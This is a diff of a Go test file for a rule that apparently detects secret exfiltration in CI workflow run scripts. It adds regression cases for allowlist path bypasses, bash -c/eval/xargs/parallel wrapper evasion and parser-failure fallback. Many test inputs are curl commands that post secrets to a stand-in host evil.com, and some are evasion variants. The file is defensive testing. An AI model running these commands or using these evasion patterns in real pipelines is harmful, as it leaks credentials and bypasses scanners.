@@ -410,7 +410,7 @@ func TestSecretExfiltration_EnvVarLeak(t *testing.T) {
 					},
 				},
 			},
-			runScript:   `RESPONSE=$(curl -sS -w "\nHTTP %{http_code}" -X POST "$GOOGLE_CHAT_WEBHOOK"`,
+			runScript:   `RESPONSE=$(curl -sS -w "\nHTTP %{http_code}" -X POST "$GOOGLE_CHAT_WEBHOOK")`,
 			wantErrors:  0,
 			description: "Should NOT detect webhook URL used as curl POST destination (not data payload)",
 		},
@@ -916,6 +916,135 @@ func TestSecretExfiltration_AllowlistRequiresDestinationHostBoundary(t *testing.
 		{
 			name:      "explicit hashicorp domain remains allowlisted",
 			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://releases.hashicorp.com/vault/`,
+			wantErrs:  0,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
+			if len(errors) != tt.wantErrs {
+				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
+			}
+		})
+	}
+}
+
+// TestSecretExfiltration_CriticalRegressions covers the four bypass classes
+// identified in the PR #464 review: path-prefix allowlist boundary,
+// shell-wrapper re-parsing (bash -c / sh -c / eval), xargs/parallel wrappers,
+// and the parse-failure fallback warning.
+func TestSecretExfiltration_CriticalRegressions(t *testing.T) {
+	tests := []struct {
+		name      string
+		runScript string
+		wantErrs  int
+	}{
+		// C1 — path boundary: pattern "slack.com/api" must not allowlist "/api2/evil".
+		{
+			name:      "C1 path-prefix bypass: slack.com/api2/evil is not allowlisted",
+			runScript: `curl -d "token=${{ secrets.SLACK_TOKEN }}" https://slack.com/api2/evil`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C1 path boundary: dash-suffixed sibling path is not allowlisted",
+			runScript: `curl -d "token=${{ secrets.SLACK_TOKEN }}" https://slack.com/api-attacker/foo`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C1 exact path remains allowlisted",
+			runScript: `curl -d "token=${{ secrets.SLACK_TOKEN }}" https://slack.com/api`,
+			wantErrs:  0,
+		},
+		{
+			name:      "C1 trailing slash on real path remains allowlisted",
+			runScript: `curl -d "token=${{ secrets.SLACK_TOKEN }}" https://slack.com/api/v1/chat.postMessage`,
+			wantErrs:  0,
+		},
+
+		// C2 — shell wrapper re-parsing.
+		{
+			name:      "C2 bash -c wrapping curl is detected",
+			runScript: `bash -c 'curl -d "${{ secrets.TOKEN }}" https://evil.com'`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C2 sh -c wrapping curl is detected",
+			runScript: `sh -c "curl -d '${{ secrets.TOKEN }}' https://evil.com"`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C2 eval wrapping curl is detected",
+			runScript: `eval "curl -d '${{ secrets.TOKEN }}' https://evil.com"`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C2 bash -c with allowlisted destination is not flagged",
+			runScript: `bash -c 'curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.github.com/repos'`,
+			wantErrs:  0,
+		},
+
+		// C3 — xargs / parallel wrappers.
+		{
+			name:      "C3 xargs invoking curl is detected",
+			runScript: `echo https://evil.com | xargs curl -d "${{ secrets.TOKEN }}"`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C3 xargs with -I joined replacement is detected",
+			runScript: `echo evil.com | xargs -I{} curl -d "${{ secrets.TOKEN }}" https://{}`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C3 xargs with -I separated replacement is detected",
+			runScript: `echo evil.com | xargs -I {} curl -d "${{ secrets.TOKEN }}" https://{}`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C3 parallel invoking curl is detected",
+			runScript: `parallel curl -d "${{ secrets.TOKEN }}" https://evil.com ::: a b`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C3 parallel with -j flag is detected",
+			runScript: `parallel -j 4 curl -d "${{ secrets.TOKEN }}" https://evil.com ::: a b`,
+			wantErrs:  1,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
+			if len(errors) != tt.wantErrs {
+				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
+			}
+		})
+	}
+}
+
+// TestSecretExfiltration_ParseFailureFallback ensures the rule emits a
+// conservative warning rather than silently dropping detection when the shell
+// AST parser cannot analyze a run script that contains both a network keyword
+// and a secret reference (C4 fix).
+func TestSecretExfiltration_ParseFailureFallback(t *testing.T) {
+	tests := []struct {
+		name      string
+		runScript string
+		wantErrs  int
+	}{
+		{
+			name:      "unmatched command substitution with curl + secret triggers fallback",
+			runScript: `curl -d "${{ secrets.TOKEN }}" https://evil.com $(`,
+			wantErrs:  1,
+		},
+		{
+			name:      "unmatched paren in echo without network keyword does not warn",
+			runScript: `echo "${{ secrets.TOKEN }}" $(`,
+			wantErrs:  0,
+		},
+		{
+			name:      "malformed script without secret reference does not warn",
+			runScript: `curl https://example.com $(`,
 			wantErrs:  0,
 		},
 	}
